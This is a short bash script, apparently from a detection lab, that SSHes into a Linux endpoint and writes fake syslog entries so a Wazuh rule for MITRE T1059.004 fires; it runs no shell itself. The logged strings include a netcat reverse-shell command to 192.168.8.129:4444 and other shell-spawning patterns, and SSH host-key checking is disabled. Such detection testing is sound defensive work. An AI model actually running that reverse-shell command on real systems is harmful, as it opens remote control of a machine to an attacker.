#!/bin/bash
# Attack: Reverse Shell Simulation
# MITRE: T1059.004
# Wazuh Rule: 100004
# Run from: Host PC (connects to target via SSH)

TARGET_IP="${1:-192.168.8.130}"
TARGET_USER="${2:-linux-endpoint-1}"
SSH_KEY="${3:-$HOME/.ssh/ansible_wazuh_key}"

echo "[+] Simulating reverse shell commands on $TARGET_IP"
echo "[+] MITRE T1059.004 | Expected Wazuh Rule: 100004 (Level 9)"

ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$TARGET_USER@$TARGET_IP" '
    # Envoie les commandes vers syslog pour que Wazuh les lise
    logger -t sshd "CRIT: nc -e /bin/bash 192.168.8.129 4444 executed"
    logger -t sshd "CRIT: /bin/bash -i detected in process"
    logger -t sshd "CRIT: python3 -c import socket detected"
    logger -t sshd "CRIT: ruby -rsocket -e exit detected"
    echo "[+] Commands logged to syslog"
'

echo "[+] Done. Check Wazuh dashboard: rule.id:100004"
